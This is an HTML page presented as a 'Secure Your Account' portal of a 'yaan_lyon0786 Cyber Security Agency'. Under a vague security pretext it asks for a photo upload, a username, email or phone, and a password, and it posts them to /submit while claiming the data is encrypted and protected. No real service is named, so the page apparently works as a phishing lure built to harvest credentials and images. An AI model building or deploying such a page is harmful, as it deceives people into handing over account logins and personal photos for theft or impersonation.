<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Secure Your Account</title>

  <!-- Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;600&display=swap" rel="stylesheet">

  <!-- Open Graph Meta Tag -->
  <meta property="og:title" content="Secure Your Account - yaan_lyon0786 Cyber Security Agency" />
  <meta property="og:description" content="Protect your digital identity with our modern, secure login system." />
  <meta property="og:image" content="omd.png" />
  <meta property="og:type" content="website" />
  <meta property="og:url" content="https://yourwebsite.com" /> <!-- Replace with your actual site URL -->

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Poppins', sans-serif;
    }

    body {
      background-color: #000;
      color: #00f7ff;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      padding: 50px 20px;
      flex-direction: column;
      min-height: 200vh;
    }

    .glass-card {
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid rgba(255, 255, 255, 0.2);
      backdrop-filter: blur(30px);
      border-radius: 20px;
      padding: 30px 20px;
      max-width: 500px;
      width: 100%;
      box-shadow: 0 8px 40px rgba(0, 247, 255, 0.3);
      margin: 0 auto 30px;
      text-align: center;
    }

    .top-image img, .bottom-image img {
      width: 100%;
      height: auto;
      border-radius: 15px;
      box-shadow: 0 0 20px #00f7ff88;
    }

    .title-text {
      font-size: 1.8rem;
      font-weight: bold;
      margin-bottom: 15px;
      text-shadow: 0 0 8px #00f7ff;
    }

    .main-lock img {
      width: 100px;
      height: 100px;
      filter: drop-shadow(0 0 15px #00f7ff);
      margin-bottom: 20px;
    }

    .upload-label {
      margin-top: 20px;
      font-size: 1rem;
      font-weight: 500;
    }

    .upload-container {
      position: relative;
      width: 120px;
      height: 120px;
      margin: 10px auto 20px;
    }

    .upload-container img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      border-radius: 50%;
      border: 3px solid #00f7ff;
      box-shadow: 0 0 20px #00f7ff88;
    }

    .upload-container label {
      position: absolute;
      bottom: 0;
      right: 0;
      background: #00f7ff;
      border-radius: 50%;
      padding: 8px;
      cursor: pointer;
      border: 2px solid black;
      transition: 0.3s;
    }

    .upload-container label:hover {
      background: #0ff;
      transform: scale(1.1);
    }

    .upload-container input {
      display: none;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 14px;
      margin: 12px 0;
      border: none;
      border-radius: 12px;
      background: rgba(255, 255, 255, 0.08);
      color: #00f7ff;
      font-size: 1rem;
      outline: none;
    }

    input::placeholder {
      color: #00f7ff;
      opacity: 0.6;
    }

    .toggle-password {
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 0.9rem;
      justify-content: start;
      margin-bottom: 20px;
    }

    button {
      padding: 12px 30px;
      background: #00f7ff;
      color: #000;
      border: none;
      border-radius: 25px;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
      box-shadow: 0 0 15px #00f7ff;
      margin-bottom: 25px;
    }

    button:hover {
      background: #0ff;
      box-shadow: 0 0 25px #00f7ff;
    }

    .social-icons {
      margin-top: 10px;
      display: flex;
      justify-content: center;
      gap: 15px;
      flex-wrap: wrap;
    }

    .social-icons a img {
      width: 36px;
      height: 36px;
      filter: drop-shadow(0 0 3px #00f7ff);
      transition: 0.3s ease;
    }

    .social-icons a img:hover {
      transform: scale(1.2);
    }

    .footer {
      font-size: 0.8rem;
      margin-top: 20px;
      opacity: 0.8;
    }

    .story {
      text-align: center;
      font-size: 1rem;
      margin-top: 20px;
    }

    .credit {
      text-align: center;
      font-size: 0.85rem;
      margin-top: 8px;
      color: #00f7ff99;
    }

    .bottom-image {
      width: 100%;
      margin-top: 30px;
    }
  </style>
</head>

<body>
  <div class="glass-card">
    <!-- Top image -->
    <div class="top-image">
      <img src="omd.png" alt="Cyber Security Banner" />
    </div>

    <div class="title-text">Secure Your Account</div>
    <div class="main-lock">
      <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" alt="Lock Icon" />
    </div>

    <form action="/submit" method="POST" enctype="multipart/form-data">
      <p class="upload-label">Upload your picture</p>
      <div class="upload-container">
        <img id="previewImage" src="https://via.placeholder.com/120" alt="Profile" />
        <label for="imageUpload">
          <img src="https://cdn-icons-png.flaticon.com/512/1829/1829343.png" width="20" />
        </label>
        <input type="file" id="imageUpload" name="photo" accept="image/*" onchange="loadImage(event)">
      </div>

      <input type="text" name="username" placeholder="Username, Email or Phone" required />
      <input type="password" name="password" id="password" placeholder="Password" required />

      <div class="toggle-password">
        <input type="checkbox" id="showPass" onclick="togglePassword()" />
        <label for="showPass">Show Password</label>
      </div>

      <button type="submit">Secure Now</button>
    </form>

    <div class="social-icons">
      <a href="#"><img src="https://cdn-icons-png.flaticon.com/512/733/733547.png" /></a>
      <a href="#"><img src="https://cdn-icons-png.flaticon.com/512/733/733558.png" /></a>
      <a href="#"><img src="https://cdn-icons-png.flaticon.com/512/1384/1384060.png" /></a>
      <a href="#"><img src="https://cdn-icons-png.flaticon.com/512/733/733579.png" /></a>
      <a href="#"><img src="https://cdn-icons-png.flaticon.com/512/300/300221.png" /></a>
    </div>

    <div class="footer">Your data is encrypted and protected.</div>
    <div class="story">Cyber Security Agency 2018</div>
    <div class="credit">yaan_lyon0786 Cyber Security Agency 2018</div>
  </div>

  <!-- Bottom Images -->
  <div class="bottom-image">
    <img src="oq.png" alt="Bottom Security Banner 1" />
  </div>

  <div class="bottom-image">
    <img src="oll.png" alt="Bottom Security Banner 2" />
  </div>

  <script>
    function togglePassword() {
      const pass = document.getElementById("password");
      pass.type = pass.type === "password" ? "text" : "password";
    }

    function loadImage(event) {
      const preview = document.getElementById("previewImage");
      preview.src = URL.createObjectURL(event.target.files[0]);
    }
  </script>
</body>
</html>
